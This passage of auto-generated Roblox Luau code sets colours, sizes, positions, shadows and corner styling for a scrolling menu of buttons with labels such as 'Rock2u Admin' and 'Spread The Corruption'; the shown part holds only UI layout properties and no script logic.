G2L["181"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["181"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["181"].BackgroundTransparency = 1
G2L["181"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["181"].BorderSizePixel = 1
G2L["181"].ClipsDescendants = false
G2L["181"].Draggable = false
G2L["181"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["181"].Rotation = 0
G2L["181"].Selectable = false
G2L["181"].SelectionOrder = 0
G2L["181"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["181"].Visible = true
G2L["181"].ZIndex = 1
G2L["181"].Parent = G2L["179"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.shadowHolder.ambientShadow
G2L["182"].Name = [[ambientShadow]]
G2L["182"].Image = [[rbxassetid://1316045217]]
G2L["182"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["182"].ScaleType = Enum.ScaleType.Slice
G2L["182"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["182"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["182"].Active = false
G2L["182"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["182"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["182"].BackgroundTransparency = 1
G2L["182"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["182"].BorderSizePixel = 1
G2L["182"].ClipsDescendants = false
G2L["182"].Draggable = false
G2L["182"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["182"].Rotation = 0
G2L["182"].Selectable = false
G2L["182"].SelectionOrder = 0
G2L["182"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["182"].Visible = true
G2L["182"].ZIndex = 1
G2L["182"].Parent = G2L["179"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.TextButton_Roundify_12px
G2L["183"].Name = [[TextButton_Roundify_12px]]
G2L["183"].Image = [[rbxassetid://3570695787]]
G2L["183"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["183"].ScaleType = Enum.ScaleType.Slice
G2L["183"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["183"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["183"].Active = true
G2L["183"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["183"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["183"].BackgroundTransparency = 1
G2L["183"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["183"].BorderSizePixel = 1
G2L["183"].ClipsDescendants = false
G2L["183"].Draggable = false
G2L["183"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["183"].Rotation = 0
G2L["183"].Selectable = true
G2L["183"].SelectionOrder = 0
G2L["183"].Size = UDim2.new(1, 0, 1, 0)
G2L["183"].Visible = true
G2L["183"].ZIndex = 1
G2L["183"].Parent = G2L["175"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rock2u Admin.ServerEventHandler
G2L["184"].Name = [[ServerEventHandler]]
G2L["184"].Parent = G2L["175"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k
G2L["185"].Name = [[Rek3k]]
G2L["185"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["185"].Text = [[Rek3k]]
G2L["185"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["185"].TextScaled = true
G2L["185"].TextSize = 14
G2L["185"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["185"].TextStrokeTransparency = 1
G2L["185"].TextWrapped = true
G2L["185"].TextXAlignment = Enum.TextXAlignment.Center
G2L["185"].TextYAlignment = Enum.TextYAlignment.Center
G2L["185"].Active = true
G2L["185"].AnchorPoint = Vector2.new(0, 0)
G2L["185"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["185"].BackgroundTransparency = 0.5
G2L["185"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["185"].BorderSizePixel = 0
G2L["185"].ClipsDescendants = false
G2L["185"].Draggable = false
G2L["185"].Position = UDim2.new(0, 0, 0, 0)
G2L["185"].Rotation = 0
G2L["185"].Selectable = true
G2L["185"].SelectionOrder = 0
G2L["185"].Size = UDim2.new(0, 200, 0, 50)
G2L["185"].Visible = true
G2L["185"].ZIndex = 1
G2L["185"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.RippleClick
G2L["186"].Name = [[RippleClick]]
G2L["186"].Parent = G2L["185"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.RippleClick.Circle
G2L["187"].Name = [[Circle]]
G2L["187"].Image = [[rbxassetid://266543268]]
G2L["187"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["187"].ScaleType = Enum.ScaleType.Stretch
G2L["187"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["187"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["187"].Active = false
G2L["187"].AnchorPoint = Vector2.new(0, 0)
G2L["187"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["187"].BackgroundTransparency = 1
G2L["187"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["187"].BorderSizePixel = 1
G2L["187"].ClipsDescendants = false
G2L["187"].Draggable = false
G2L["187"].Position = UDim2.new(0, 0, 0, 0)
G2L["187"].Rotation = 0
G2L["187"].Selectable = false
G2L["187"].SelectionOrder = 0
G2L["187"].Size = UDim2.new(0, 0, 0, 0)
G2L["187"].Visible = true
G2L["187"].ZIndex = 10
G2L["187"].Parent = G2L["186"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder
G2L["188"].Name = [[shadowHolder]]
G2L["188"].Active = false
G2L["188"].AnchorPoint = Vector2.new(0, 0)
G2L["188"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["188"].BackgroundTransparency = 1
G2L["188"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["188"].BorderSizePixel = 1
G2L["188"].ClipsDescendants = false
G2L["188"].Draggable = false
G2L["188"].Position = UDim2.new(0, 0, 0, 0)
G2L["188"].Rotation = 0
G2L["188"].Selectable = false
G2L["188"].SelectionOrder = 0
G2L["188"].Size = UDim2.new(1, 0, 1, 0)
G2L["188"].Visible = true
G2L["188"].ZIndex = -1
G2L["188"].Parent = G2L["185"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder.umbraShadow
G2L["189"].Name = [[umbraShadow]]
G2L["189"].Image = [[rbxassetid://1316045217]]
G2L["189"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["189"].ScaleType = Enum.ScaleType.Slice
G2L["189"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["189"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["189"].Active = false
G2L["189"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["189"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["189"].BackgroundTransparency = 1
G2L["189"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["189"].BorderSizePixel = 1
G2L["189"].ClipsDescendants = false
G2L["189"].Draggable = false
G2L["189"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["189"].Rotation = 0
G2L["189"].Selectable = false
G2L["189"].SelectionOrder = 0
G2L["189"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["189"].Visible = true
G2L["189"].ZIndex = 1
G2L["189"].Parent = G2L["188"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder.penumbraShadow
G2L["190"].Name = [[penumbraShadow]]
G2L["190"].Image = [[rbxassetid://1316045217]]
G2L["190"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["190"].ScaleType = Enum.ScaleType.Slice
G2L["190"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["190"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["190"].Active = false
G2L["190"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["190"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["190"].BackgroundTransparency = 1
G2L["190"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["190"].BorderSizePixel = 1
G2L["190"].ClipsDescendants = false
G2L["190"].Draggable = false
G2L["190"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["190"].Rotation = 0
G2L["190"].Selectable = false
G2L["190"].SelectionOrder = 0
G2L["190"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["190"].Visible = true
G2L["190"].ZIndex = 1
G2L["190"].Parent = G2L["188"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.shadowHolder.ambientShadow
G2L["191"].Name = [[ambientShadow]]
G2L["191"].Image = [[rbxassetid://1316045217]]
G2L["191"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["191"].ScaleType = Enum.ScaleType.Slice
G2L["191"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["191"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["191"].Active = false
G2L["191"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["191"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["191"].BackgroundTransparency = 1
G2L["191"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["191"].BorderSizePixel = 1
G2L["191"].ClipsDescendants = false
G2L["191"].Draggable = false
G2L["191"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["191"].Rotation = 0
G2L["191"].Selectable = false
G2L["191"].SelectionOrder = 0
G2L["191"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["191"].Visible = true
G2L["191"].ZIndex = 1
G2L["191"].Parent = G2L["188"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.TextButton_Roundify_12px
G2L["192"].Name = [[TextButton_Roundify_12px]]
G2L["192"].Image = [[rbxassetid://3570695787]]
G2L["192"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["192"].ScaleType = Enum.ScaleType.Slice
G2L["192"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["192"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["192"].Active = true
G2L["192"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["192"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["192"].BackgroundTransparency = 1
G2L["192"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["192"].BorderSizePixel = 1
G2L["192"].ClipsDescendants = false
G2L["192"].Draggable = false
G2L["192"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["192"].Rotation = 0
G2L["192"].Selectable = true
G2L["192"].SelectionOrder = 0
G2L["192"].Size = UDim2.new(1, 0, 1, 0)
G2L["192"].Visible = true
G2L["192"].ZIndex = 1
G2L["192"].Parent = G2L["185"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.UICorner
G2L["193"].Name = [[UICorner]]
G2L["193"].CornerRadius = UDim.new(0, 10)
G2L["193"].Parent = G2L["185"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Rek3k.ServerEventHandler
G2L["194"].Name = [[ServerEventHandler]]
G2L["194"].Parent = G2L["185"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption
G2L["195"].Name = [[Spread The Corruption]]
G2L["195"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["195"].Text = [[Spread The Corruption]]
G2L["195"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["195"].TextScaled = true
G2L["195"].TextSize = 14
G2L["195"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["195"].TextStrokeTransparency = 1
G2L["195"].TextWrapped = true
G2L["195"].TextXAlignment = Enum.TextXAlignment.Center
G2L["195"].TextYAlignment = Enum.TextYAlignment.Center
G2L["195"].Active = true
G2L["195"].AnchorPoint = Vector2.new(0, 0)
G2L["195"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["195"].BackgroundTransparency = 0.5
G2L["195"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["195"].BorderSizePixel = 0
G2L["195"].ClipsDescendants = false
G2L["195"].Draggable = false
G2L["195"].Position = UDim2.new(0, 0, 0, 0)
G2L["195"].Rotation = 0
G2L["195"].Selectable = true
G2L["195"].SelectionOrder = 0
G2L["195"].Size = UDim2.new(0, 200, 0, 50)
G2L["195"].Visible = true
G2L["195"].ZIndex = 1
G2L["195"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.UICorner
G2L["196"].Name = [[UICorner]]
G2L["196"].CornerRadius = UDim.new(0, 10)
G2L["196"].Parent = G2L["195"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.RippleClick
G2L["197"].Name = [[RippleClick]]
G2L["197"].Parent = G2L["195"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.RippleClick.Circle
G2L["198"].Name = [[Circle]]
G2L["198"].Image = [[rbxassetid://266543268]]
G2L["198"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["198"].ScaleType = Enum.ScaleType.Stretch
G2L["198"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["198"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["198"].Active = false
G2L["198"].AnchorPoint = Vector2.new(0, 0)
G2L["198"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["198"].BackgroundTransparency = 1
G2L["198"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["198"].BorderSizePixel = 1
G2L["198"].ClipsDescendants = false
G2L["198"].Draggable = false
G2L["198"].Position = UDim2.new(0, 0, 0, 0)
G2L["198"].Rotation = 0
G2L["198"].Selectable = false
G2L["198"].SelectionOrder = 0
G2L["198"].Size = UDim2.new(0, 0, 0, 0)
G2L["198"].Visible = true
G2L["198"].ZIndex = 10
G2L["198"].Parent = G2L["197"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder
G2L["199"].Name = [[shadowHolder]]
G2L["199"].Active = false
G2L["199"].AnchorPoint = Vector2.new(0, 0)
G2L["199"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["199"].BackgroundTransparency = 1
G2L["199"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["199"].BorderSizePixel = 1
G2L["199"].ClipsDescendants = false
G2L["199"].Draggable = false
G2L["199"].Position = UDim2.new(0, 0, 0, 0)
G2L["199"].Rotation = 0
G2L["199"].Selectable = false
G2L["199"].SelectionOrder = 0
G2L["199"].Size = UDim2.new(1, 0, 1, 0)
G2L["199"].Visible = true
G2L["199"].ZIndex = -1
G2L["199"].Parent = G2L["195"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder.umbraShadow
G2L["200"].Name = [[umbraShadow]]
G2L["200"].Image = [[rbxassetid://1316045217]]
G2L["200"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["200"].ScaleType = Enum.ScaleType.Slice
G2L["200"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["200"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["200"].Active = false
G2L["200"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["200"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["200"].BackgroundTransparency = 1
G2L["200"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["200"].BorderSizePixel = 1
G2L["200"].ClipsDescendants = false
G2L["200"].Draggable = false
G2L["200"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["200"].Rotation = 0
G2L["200"].Selectable = false
G2L["200"].SelectionOrder = 0
G2L["200"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["200"].Visible = true
G2L["200"].ZIndex = 1
G2L["200"].Parent = G2L["199"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder.penumbraShadow
G2L["201"].Name = [[penumbraShadow]]
G2L["201"].Image = [[rbxassetid://1316045217]]
G2L["201"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["201"].ScaleType = Enum.ScaleType.Slice
G2L["201"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["201"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["201"].Active = false
G2L["201"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["201"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["201"].BackgroundTransparency = 1
G2L["201"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["201"].BorderSizePixel = 1
G2L["201"].ClipsDescendants = false
G2L["201"].Draggable = false
G2L["201"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["201"].Rotation = 0
G2L["201"].Selectable = false
G2L["201"].SelectionOrder = 0
G2L["201"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["201"].Visible = true
G2L["201"].ZIndex = 1
G2L["201"].Parent = G2L["199"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.shadowHolder.ambientShadow
G2L["202"].Name = [[ambientShadow]]
G2L["202"].Image = [[rbxassetid://1316045217]]
G2L["202"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["202"].ScaleType = Enum.ScaleType.Slice
G2L["202"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["202"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["202"].Active = false
G2L["202"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["202"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["202"].BackgroundTransparency = 1
G2L["202"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["202"].BorderSizePixel = 1
G2L["202"].ClipsDescendants = false
G2L["202"].Draggable = false
G2L["202"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["202"].Rotation = 0
G2L["202"].Selectable = false
G2L["202"].SelectionOrder = 0
G2L["202"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["202"].Visible = true
G2L["202"].ZIndex = 1
G2L["202"].Parent = G2L["199"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.TextButton_Roundify_12px
G2L["203"].Name = [[TextButton_Roundify_12px]]
G2L["203"].Image = [[rbxassetid://3570695787]]
G2L["203"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["203"].ScaleType = Enum.ScaleType.Slice
G2L["203"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["203"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["203"].Active = true
G2L["203"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["203"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["203"].BackgroundTransparency = 1
G2L["203"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["203"].BorderSizePixel = 1
G2L["203"].ClipsDescendants = false
G2L["203"].Draggable = false
G2L["203"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["203"].Rotation = 0
G2L["203"].Selectable = true
G2L["203"].SelectionOrder = 0
G2L["203"].Size = UDim2.new(1, 0, 1, 0)
G2L["203"].Visible = true
G2L["203"].ZIndex = 1
G2L["203"].Parent = G2L["195"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Spread The Corruption.ServerEventHandler
G2L["204"].Name = [[ServerEventHandler]]
G2L["204"].Parent = G2L["195"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection
G2L["205"].Name = [[Verified Legacy Scripts Collection]]
G2L["205"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["205"].Text = [[Verified Legacy Scripts Collection]]
G2L["205"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["205"].TextScaled = true
G2L["205"].TextSize = 14
G2L["205"].TextStrokeColor3 = Color3.fromRGB(255, 240, 240)
G2L["205"].TextStrokeTransparency = 1
G2L["205"].TextWrapped = true
G2L["205"].TextXAlignment = Enum.TextXAlignment.Center
G2L["205"].TextYAlignment = Enum.TextYAlignment.Center
G2L["205"].Active = true
G2L["205"].AnchorPoint = Vector2.new(0, 0)
G2L["205"].BackgroundColor3 = Color3.fromRGB(200, 0, 255)
G2L["205"].BackgroundTransparency = 0.5
G2L["205"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["205"].BorderSizePixel = 1
G2L["205"].ClipsDescendants = false
G2L["205"].Draggable = false
G2L["205"].Position = UDim2.new(0.19214876, 0, -0.016759777, 0)
G2L["205"].Rotation = 0
G2L["205"].Selectable = true
G2L["205"].SelectionOrder = 0
G2L["205"].Size = UDim2.new(0, 100, 0, 67)
G2L["205"].Visible = true
G2L["205"].ZIndex = 1
G2L["205"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.UICorner
G2L["206"].Name = [[UICorner]]
G2L["206"].CornerRadius = UDim.new(0, 8)
G2L["206"].Parent = G2L["205"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.ServerEventHandler
G2L["207"].Name = [[ServerEventHandler]]
G2L["207"].Parent = G2L["205"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.TextButton_Roundify_12px
G2L["208"].Name = [[TextButton_Roundify_12px]]
G2L["208"].Image = [[rbxassetid://3570695787]]
G2L["208"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["208"].ScaleType = Enum.ScaleType.Slice
G2L["208"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["208"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["208"].Active = true
G2L["208"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["208"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["208"].BackgroundTransparency = 1
G2L["208"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["208"].BorderSizePixel = 1
G2L["208"].ClipsDescendants = false
G2L["208"].Draggable = false
G2L["208"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["208"].Rotation = 0
G2L["208"].Selectable = true
G2L["208"].SelectionOrder = 0
G2L["208"].Size = UDim2.new(1, 0, 1, 0)
G2L["208"].Visible = true
G2L["208"].ZIndex = 1
G2L["208"].Parent = G2L["205"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder
G2L["209"].Name = [[shadowHolder]]
G2L["209"].Active = false
G2L["209"].AnchorPoint = Vector2.new(0, 0)
G2L["209"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["209"].BackgroundTransparency = 1
G2L["209"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["209"].BorderSizePixel = 1
G2L["209"].ClipsDescendants = false
G2L["209"].Draggable = false
G2L["209"].Position = UDim2.new(0, 0, 0, 0)
G2L["209"].Rotation = 0
G2L["209"].Selectable = false
G2L["209"].SelectionOrder = 0
G2L["209"].Size = UDim2.new(1, 0, 1, 0)
G2L["209"].Visible = true
G2L["209"].ZIndex = -1
G2L["209"].Parent = G2L["205"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder.umbraShadow
G2L["210"].Name = [[umbraShadow]]
G2L["210"].Image = [[rbxassetid://1316045217]]
G2L["210"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["210"].ScaleType = Enum.ScaleType.Slice
G2L["210"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["210"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["210"].Active = false
G2L["210"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["210"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["210"].BackgroundTransparency = 1
G2L["210"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["210"].BorderSizePixel = 1
G2L["210"].ClipsDescendants = false
G2L["210"].Draggable = false
G2L["210"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["210"].Rotation = 0
G2L["210"].Selectable = false
G2L["210"].SelectionOrder = 0
G2L["210"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["210"].Visible = true
G2L["210"].ZIndex = 1
G2L["210"].Parent = G2L["209"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder.penumbraShadow
G2L["211"].Name = [[penumbraShadow]]
G2L["211"].Image = [[rbxassetid://1316045217]]
G2L["211"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["211"].ScaleType = Enum.ScaleType.Slice
G2L["211"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["211"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["211"].Active = false
G2L["211"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["211"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["211"].BackgroundTransparency = 1
G2L["211"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["211"].BorderSizePixel = 1
G2L["211"].ClipsDescendants = false
G2L["211"].Draggable = false
G2L["211"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["211"].Rotation = 0
G2L["211"].Selectable = false
G2L["211"].SelectionOrder = 0
G2L["211"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["211"].Visible = true
G2L["211"].ZIndex = 1
G2L["211"].Parent = G2L["209"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Verified Legacy Scripts Collection.shadowHolder.ambientShadow
G2L["212"].Name = [[ambientShadow]]
G2L["212"].Image = [[rbxassetid://1316045217]]
G2L["212"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["212"].ScaleType = Enum.ScaleType.Slice
G2L["212"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["212"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["212"].Active = false
G2L["212"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["212"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["212"].BackgroundTransparency = 1
G2L["212"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["212"].BorderSizePixel = 1
G2L["212"].ClipsDescendants = false
G2L["212"].Draggable = false
G2L["212"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["212"].Rotation = 0
G2L["212"].Selectable = false
G2L["212"].SelectionOrder = 0
G2L["212"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["212"].Visible = true
G2L["212"].ZIndex = 1
G2L["212"].Parent = G2L["209"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns
G2L["213"].Name = [[stummy's guns]]
G2L["213"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["213"].Text = [[stummy's guns]]
G2L["213"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["213"].TextScaled = true
G2L["213"].TextSize = 14
G2L["213"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["213"].TextStrokeTransparency = 1
G2L["213"].TextWrapped = true
G2L["213"].TextXAlignment = Enum.TextXAlignment.Center
G2L["213"].TextYAlignment = Enum.TextYAlignment.Center
G2L["213"].Active = true
G2L["213"].AnchorPoint = Vector2.new(0, 0)
G2L["213"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["213"].BackgroundTransparency = 0.5
G2L["213"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["213"].BorderSizePixel = 0
G2L["213"].ClipsDescendants = false
G2L["213"].Draggable = false
G2L["213"].Position = UDim2.new(0, 0, 0, 0)
G2L["213"].Rotation = 0
G2L["213"].Selectable = true
G2L["213"].SelectionOrder = 0
G2L["213"].Size = UDim2.new(0, 200, 0, 50)
G2L["213"].Visible = true
G2L["213"].ZIndex = 1
G2L["213"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.stummy's guns.TextButton_Roundify_12px
G2L["214"].Name = [[TextButton_Roundify_12px]]
G2L["214"].Image = [[rbxassetid://3570695787]]
G2L["214"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["214"].ScaleType = Enum.ScaleType.Slice
G2L["214"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["214"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["214"].Active = true
G2L["214"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["214"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["214"].BackgroundTransparency = 1
G2L["214"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["214"].BorderSizePixel = 1
G2L["214"].ClipsDescendants = false
G2L["214"].Draggable = false
